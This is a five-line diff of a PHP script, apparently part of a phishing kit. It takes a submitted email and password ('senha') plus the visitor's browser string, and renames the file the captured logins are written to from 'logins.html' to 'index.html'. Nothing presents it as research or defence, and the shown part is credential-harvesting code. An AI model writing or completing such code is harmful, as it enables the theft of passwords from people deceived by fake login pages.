@@ -1,5 +1,5 @@
 <?php
-$nomearquivo ="logins.html";
+$nomearquivo ="index.html";
 $email =$_POST["email"];
 $senha =$_POST["pass"];
 $browser =$_SERVER['HTTP_USER_AGENT'];
